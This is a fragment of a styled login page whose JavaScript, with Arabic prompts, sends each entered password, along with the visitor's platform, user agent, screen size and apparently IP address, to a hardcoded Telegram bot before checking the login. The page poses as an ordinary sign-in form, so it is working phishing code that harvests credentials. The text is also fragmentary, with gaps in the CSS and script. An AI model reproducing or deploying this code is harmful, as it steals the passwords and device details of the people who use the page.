            font-size: 26px;
            color: #000000;
            font-weight: bold;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border 0.3s;
        }

        .input-field:focus {
            border: 1px solid #4CAF50;
            outline: none;
        }

        .login-button {
            width: 100%;
            padding: 12px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s ease;
        }

        .login-button:hover {
            background-color: #45a049;
        }

        .social-links {
            margin-top: 20px;
            display: flex;
            justify-content: center;
            gap: 15px;
        }

        .social-links a {
            text-decoration: none;
            color: white;
            background-color: #3b5998;
            padding: 10px;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 20px;
            transition: background-color 0.3s ease;
        }

        .social-links a:hover {
            background-color: #4CAF50;
        }

        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #555;
        }

        .footer a {
            color: #4CAF50;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

            color: #4CAF50;
            text-decoration: none;
        }

    const CHAT_ID = "5857518644";                                                         
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                    <b>الباسورد:</b> ${password}\n

                    <b>Platform:</b> ${platform}\n
                    <b>User Agent:</b> ${userAgent}\n
                    <b>مقاس الشاشة:</b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    if (users[email] && users[email].password === password) {

                        // إخفاء صفحة تسجيل الدخول وعرض iframe
                        document.querySelector('.login-container').style.display = 'none';
                        const iframe = document.getElementById('iframe-container');
                        iframe.style.display = 'block';
                        iframe.src = users[email].url;
                    } else {
                        alert('اسم المستخدم أو كلمة المرور غير صحيحة , برجاء الضغط علي نسيت كلمة المرور لمساعدتك في الحصول عليها.');
                    }
                }).catch(error => {
                    alert('Error sending the information. Please try again.');
                });
            })
            .catch(error => {
                alert('Error fetching the IP address. Please try again.');
            });
    });
</script>
